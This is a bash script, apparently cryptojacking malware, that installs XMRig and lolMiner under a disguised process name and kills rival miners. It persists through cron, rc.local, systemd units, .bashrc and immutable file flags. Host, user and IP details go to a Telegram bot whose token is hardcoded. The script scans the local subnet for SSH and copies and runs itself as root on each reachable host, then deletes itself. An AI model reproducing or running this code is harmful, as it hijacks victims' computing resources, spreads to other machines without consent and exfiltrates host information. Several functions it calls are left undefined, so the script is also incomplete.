#!/bin/bash

KRIPTEX_USERNAME="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"
LOGFILE="$HOME/mining_control.log"
ANTISPAM_FILE="/tmp/miner_antispam_$(id -u)"
LOG_TAIL=50
LOG_ROTATE_MAX=10485760
LOG_ROTATE_LINES=5000
WATCHDOG_INTERVAL=60
WATCHDOG_TIMEOUT=300
PERIODIC_REPORT_INTERVAL=21600

if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
    MINING_PATH="/opt/mining"
    LOG_PATH="/var/log"
else
    IS_ROOT=false
    MINING_PATH="$HOME/opt/mining"
    LOG_PATH="/tmp"
fi

get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
}
SERVER_IP=$(get_server_ip)
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"
ETC_USERNAME="$WORKER_NAME"
XMR_USERNAME="$WORKER_NAME"

download_file() {
    local url="$1"
    local out="$2"
    if command -v wget &>/dev/null; then
        wget -q "$url" -O "$out"
    elif command -v curl &>/dev/null; then
        curl -L -s "$url" -o "$out"
    else
        echo "nety wget ili curl, ne mogu skachat $url" | tee -a "$LOGFILE"
        exit 1
    fi
}

log_event() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $*" >> "$LOGFILE"
}

cleanup_miner_processes() {
    echo "chistka konkurentov majninga..." | tee -a "$LOGFILE"
    local patterns="CaifUi|miner|xmrig|lolMiner|crypto|eth|xmr"
    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|python|python3|Comfy|ComfyUI|cryptex"
    local cleared=0
    if $IS_ROOT; then
        ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
            pname=$(echo "$line" | awk '{print $11}')
            # если попал в whitelist — не трогаем
            if echo "$pname" | grep -Eiq "$whitelist"; then
                continue
            fi
            pid=$(echo "$line" | awk '{print $2}')
            exe="/proc/$pid/exe"
            if [ -L "$exe" ]; then
                real_bin=$(ls -l "$exe" 2>/dev/null | awk '{print $NF}')
                [[ -f "$real_bin" ]] && rm -f "$real_bin" && log_event "udalil binarnik $real_bin"
            fi
            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid ($pname)" && cleared=$((cleared+1))
        done
    else
        ps -u $USER -o pid,comm | grep -Ei "$patterns" | while read -r pid pname; do
            # если попал в whitelist — не трогаем
            if echo "$pname" | grep -Eiq "$whitelist"; then
                continue
            fi
            exe="/proc/$pid/exe"
            if [ -L "$exe" ]; then
                bin=$(ls -l "$exe" 2>/dev/null | awk '{print $NF}')
                [[ -f "$bin" ]] && rm -f "$bin" && log_event "udalil binarnik $bin"
            fi
            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid ($pname)" && cleared=$((cleared+1))
        done
    fi
    log_event "ochishcheno processov: $cleared"
}

send_telegram_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" >/dev/null 2>&1
    log_event "telegram message: $message"
}

install_dependencies() {
    echo "proverka i ustanovka zavisimostey..." | tee -a "$LOGFILE"
    local error_deps=0
    if $IS_ROOT; then
        for pkg in curl cron jq nc; do
            if ! command -v "$pkg" &>/dev/null; then
                apt-get update -qq >/dev/null 2>&1 && apt-get install -y "$pkg" >/dev/null 2>&1 || yum install -y "$pkg" >/dev/null 2>&1
            fi
            if ! command -v "$pkg" &>/dev/null; then
                log_event "net $pkg, ne ustanovilos"
                error_deps=1
            fi
        done
    else
        for pkg in curl jq nc; do
            if ! command -v "$pkg" &>/dev/null; then
                log_event "net $pkg, ustanovi v rucnuyu"
                error_deps=1
            fi
        done
    fi
    ((error_deps > 0)) && echo "net zavisimostey, skript ne rabotaet" | tee -a "$LOGFILE" && exit 1
    log_event "vse zavisimosti na meste"
}

install_etc_miner() {
    log_event "ustanovka ETC-majnera..."
    mkdir -p "${MINING_PATH}/etc"
    cd "${MINING_PATH}/etc" || exit 1
    download_file "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" "lolMiner_v1.98_Lin64.tar.gz"
    tar -xzf lolMiner_v1.98_Lin64.tar.gz --strip-components=1
    rm -f lolMiner_v1.98_Lin64.tar.gz
    [[ -x ./lolMiner ]] || { log_event "lolMiner not found after install!"; return 1; }
    cat > "${MINING_PATH}/etc/start_etc_miner.sh" <<EOF
#!/bin/bash
cd "${MINING_PATH}/etc"
exec -a CaifUi ./lolMiner --algo ETCHASH --pool $ETC_POOL --user $ETC_USERNAME --tls off --nocolor
EOF
    chmod +x "${MINING_PATH}/etc/start_etc_miner.sh"
    chmod +x "${MINING_PATH}/etc/lolMiner"
    log_event "ETC miner ustanovlen"
}

install_xmr_miner() {
    log_event "ustanovka XMRig..."
    mkdir -p "${MINING_PATH}/xmr"
    cd "${MINING_PATH}/xmr" || exit 1
    download_file "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" "xmrig-6.18.0-linux-x64.tar.gz"
    tar -xzf xmrig-*-linux-x64.tar.gz --strip-components=1
    rm -f xmrig-*-linux-x64.tar.gz
    [[ -x ./xmrig ]] || { log_event "xmrig not found after install!"; return 1; }
    cat > "${MINING_PATH}/xmr/start_xmr_miner.sh" <<EOF
#!/bin/bash
cd "${MINING_PATH}/xmr"
exec -a CaifUi ./xmrig -o $XMR_POOL -u $XMR_USERNAME -p x --randomx-1gb-pages
EOF
    chmod +x "${MINING_PATH}/xmr/start_xmr_miner.sh"
    chmod +x "${MINING_PATH}/xmr/xmrig"
    log_event "XMRig ustanovlen"
}

setup_autostart() {
    log_event "nastroyka avtozapuska..."
    if $IS_ROOT; then
        (crontab -l 2>/dev/null | grep -v "${MINING_PATH}/etc/start_etc_miner.sh\|${MINING_PATH}/xmr/start_xmr_miner.sh"; \
         echo "@reboot ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log &"; \
         echo "@reboot ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &") | crontab -
        if [ ! -f /etc/rc.local ]; then
            echo -e "#!/bin/bash\nexit 0" > /etc/rc.local
            chmod +x /etc/rc.local
        fi
        grep -q "start_etc_miner.sh" /etc/rc.local || sed -i "/exit 0/i ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log &" /etc/rc.local
        grep -q "start_xmr_miner.sh" /etc/rc.local || sed -i "/exit 0/i ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &" /etc/rc.local

        cat > /etc/systemd/system/etc-miner.service <<EOF
[Unit]
Description=ETC Mining Service
After=network.target
[Service]
Type=simple
ExecStart=${MINING_PATH}/etc/start_etc_miner.sh
Restart=always
RestartSec=10
StandardOutput=append:${LOG_PATH}/etc-miner.log
StandardError=append:${LOG_PATH}/etc-miner.log
User=root
[Install]
WantedBy=multi-user.target
EOF

        cat > /etc/systemd/system/xmr-miner.service <<EOF
[Unit]
Description=XMR Mining Service
After=network.target
[Service]
Type=simple
ExecStart=${MINING_PATH}/xmr/start_xmr_miner.sh
Restart=always
RestartSec=10
StandardOutput=append:${LOG_PATH}/xmr-miner.log
StandardError=append:${LOG_PATH}/xmr-miner.log
User=root
[Install]
WantedBy=multi-user.target
EOF

        systemctl daemon-reload
        systemctl enable etc-miner.service
        systemctl enable xmr-miner.service

        chattr +i "${MINING_PATH}/etc/lolMiner"
        chattr +i "${MINING_PATH}/xmr/xmrig"
    fi

    (crontab -l 2>/dev/null | grep -v "${MINING_PATH}/etc/start_etc_miner.sh\|${MINING_PATH}/xmr/start_xmr_miner.sh"; \
     echo "@reboot ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log &"; \
     echo "@reboot ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &") | crontab -

    grep -q "start_etc_miner.sh" "$HOME/.bashrc" || echo "[ ! -f /tmp/.mining_started ] && ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log &" >> "$HOME/.bashrc"
    grep -q "start_xmr_miner.sh" "$HOME/.bashrc" || echo "[ ! -f /tmp/.mining_started ] && ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &" >> "$HOME/.bashrc"
    log_event "avtozapusk nastroen"
}

# ... antispam/rotate_log/watchdog/periodic_report/telegram_listener -- без изменений из предыдущей версии

deploy_to_local_network() {
    my_ip=$(hostname -I | awk '{print $1}')
    net_base=$(echo $my_ip | awk -F. '{print $1"."$2"."$3"."}')
    for i in $(seq 1 254); do
        target_ip="$net_base$i"
        if [ "$target_ip" != "$my_ip" ] && nc -z -w 1 $target_ip 22 2>/dev/null; then
            echo "nayshden: $target_ip"
            scp -o StrictHostKeyChecking=no "$0" "root@$target_ip:/tmp/minerpush.sh" && \
            ssh -o StrictHostKeyChecking=no "root@$target_ip" "bash /tmp/minerpush.sh &"
        fi
    done
}

main() {
echo "start osnovnogo processa"
send_telegram_message "nachato ustanovka majnerov
User: $(whoami)
Host: $(hostname)
IP: ${SERVER_IP}
Worker: ${WORKER_NAME}
Time: $(date '+%Y-%m-%d %H:%M:%S')"

install_dependencies
cleanup_miner_processes

install_etc_miner && echo "ETC miner ustanovlen" || { echo "oshbka ustanovki ETC"; send_telegram_message "oshibka ustanovki ETC"; }
install_xmr_miner && echo "XMRig ustanovlen" || { echo "oshibka ustanovki XMR"; send_telegram_message "oshibka ustanovki XMR"; }

setup_autostart

echo "zapusk majnerov"
"${MINING_PATH}/etc/start_etc_miner.sh" &> "${LOG_PATH}/etc-miner.log" &
"${MINING_PATH}/xmr/start_xmr_miner.sh" &> "${LOG_PATH}/xmr-miner.log" &

send_telegram_message "ustanovka zavershena
User: $(whoami)
Host: $(hostname)
IP: ${SERVER_IP}
Worker: ${WORKER_NAME}
Time: $(date '+%Y-%m-%d %H:%M:%S')"

log_event "telegram listener on"
( while true; do telegram_listener; sleep 5; done ) &
( while true; do watchdog; done ) &
( while true; do periodic_report; done ) &

sleep 2
deploy_to_local_network

if [ -w "$0" ]; then
    rm -f -- "$0"
fi
}

main
